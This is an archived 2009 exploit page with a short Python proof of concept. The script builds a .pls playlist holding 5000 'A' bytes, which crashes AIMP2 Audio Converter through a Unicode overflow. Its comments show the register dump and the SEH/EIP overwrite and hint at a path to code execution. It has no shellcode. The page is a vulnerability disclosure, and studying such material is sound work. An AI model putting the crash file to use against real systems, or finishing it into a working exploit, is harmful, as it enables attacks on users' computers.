<html><head><title>AIMP2 Audio Converter <= 2.53b330 (.pls/.m3u) Unicode Crash PoC</title></head><pre>#!/usr/bin/python
#
# ######################################################################
#
# AIMP2 Audio Converter &lt;= 2.53 (build 330) (.pls/.m3u) Unicode local crash PoC
# Found &amp; exploited by: mr_me
# Download: ftp://www.catode.ru/AIMP/aimp_2.51.330.zip
# Tested on: Wind0ws XP SP3
# 
# ######################################################################
#
# Unicode overflow, maybe someone with better skills can exploit this 
# you need to overwrite SEH handler with a CALL EAX 0x00XX00XX instruction.
# Here is the crash breakdown:
# 
# EAX 001B0020 UNICODE &quot;AAAAAAAAAAAAAAAAAAAA~
# ECX 00000273
# EDX 00000C4C
# EBX 00000000
# ESP 0012DCA8
# EBP 0012DD64
# ESI 001B6610 UNICODE &quot;AAAAAAAAAAAAAAAAAAAA~
# EDI 00130000 ASCII &quot;Actx &quot;
# EIP 004530C6 AIMP2.004530C6
#
# And then when we pass the exemption handler to overwrite EIP...
#
# EIP 00410041
#

header = (&quot;[playlist]\nNumberOfEntries=3\n\n&quot;);
header += (&quot;File1=&quot;);
crash = (&quot;\x41&quot; * 5000);

buffer = header + crash
file=open('mr_mes_funky.pls','w')
file.write(buffer)
file.close()
print &quot;[+] mr_mes_funky.pls file created successfully&quot;

# milw0rm.com [2009-09-01]</pre></html>